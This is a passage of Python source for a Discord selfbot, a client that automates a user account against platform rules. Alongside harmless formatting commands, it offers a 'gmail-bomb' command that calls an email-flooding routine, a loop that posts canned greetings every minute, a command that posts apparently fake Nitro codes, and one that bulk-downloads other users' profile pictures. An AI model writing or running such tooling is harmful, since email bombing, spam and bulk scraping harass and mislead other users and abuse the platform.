    await ctx.send('**'+message+'**')

@stselfbot.command()
async def secret(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Secret]'''+Fore.RESET)
    await ctx.send('||'+message+'||')

@stselfbot.command(name='role-hexcode', aliases=['rolecolor'])
async def _role_hexcode(ctx, *, role: discord.Role): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Rolehexcode]'''+Fore.RESET)
    await ctx.send(f"{role.name} : {role.color}")

@stselfbot.command(name='get-hwid', aliases=['hwid', 'gethwid', 'hwidget'])
async def _get_hwid(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Gethwid]'''+Fore.RESET)
    print(f"HWID: {Fore.YELLOW}{hwid}"+Fore.RESET)

@stselfbot.command()
async def empty(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Empty]'''+Fore.RESET)
    await ctx.send(chr(173))

@stselfbot.command()
async def everyone(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Everyone]'''+Fore.RESET)
    await ctx.send('https://@everyone@google.com')

@stselfbot.command()
async def logout(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Logout]'''+Fore.RESET)
    await stselfbot.logout()

@stselfbot.command(aliases=['btc-stream', 'streambtc', 'stream-btc', 'btcstatus'])
async def btcstream(ctx):  # b'\xfc'
    await ctx.message.delete()   
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Btcstream]'''+Fore.RESET)
    btc_status.start()        

@stselfbot.command(name='steal-all-pfp', aliases=['steal-all-pfps', 'stealallpfps'])
async def _steal_all_pfp(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Stealallpfp]'''+Fore.RESET)
    Dump(ctx)

@stselfbot.command(aliases=['clearconsole', 'consoleclear'])
async def cls(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Cls]'''+Fore.RESET)
    Clear()
    startprint()

@stselfbot.command()
async def nitro(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Nitro]'''+Fore.RESET)
    await ctx.send(Nitro())

@stselfbot.command()
async def edit(ctx, text):
    amount = 0
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Edit]'''+Fore.RESET)
    channel_id = ctx.message.channel.id
    cid = await stselfbot.fetch_channel(int(channel_id))
    async for msg in cid.history(limit=None).filter(lambda m: m.author == stselfbot.user).map(lambda m: m):
        try:
            await msg.edit(content=text)
            amount += 1
        except Exception:
            pass

@stselfbot.command()
async def banner(ctx, user:discord.User):
    await ctx.message.delete()
    if user == None:
        user = ctx.author
    req = await stselfbot.http.request(discord.http.Route("GET", "/users/{uid}", uid=user.id))
    banner_id = req["banner"]
    if banner_id:
        banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_id}?size=1024"
    else:
        print("User doesn't have a banner.")
    await ctx.send(f"{banner_url}")

@stselfbot.command()
async def stoptextppl(ctx):
    await ctx.message.delete
    stoptextppl.has_been_called = True
    pass
stoptextppl.has_been_called = False

@stselfbot.command()
async def textppl(ctx):
    await ctx.message.delete()
    while True:
        cool123 = ['Hello!', "What's up guys?", 'Hi guys!', 'whats up chat', 'hey lol', 'hey chat']
        await ctx.send(random.choice(cool123))
        await asyncio.sleep(60)
        if stoptextppl.has_been_called:
            break

@stselfbot.command()
async def advice(ctx):
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Advice]'''+Fore.RESET)
    r = requests.get('https://api.adviceslip.com/advice')
    await ctx.send(r.json()['slip']['advice'])

@stselfbot.command()
async def junknick(ctx):
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Junknick]'''+Fore.RESET)
    try:
        name = 'ðﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫðﾒﾐðﾒﾐﾫðﾒﾐﾫðﾒﾐﾫ'
        await ctx.author.edit(nick=name)
        await ctx.author.edit(nick=name)
    except Exception as e:
        try:
            await ctx.send(f"Error: {e}")
        finally:
            e = None
            del e

@stselfbot.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Gmailbomb]'''+Fore.RESET)
    GmailBomber()

if __name__ == '__main__':
    Init()
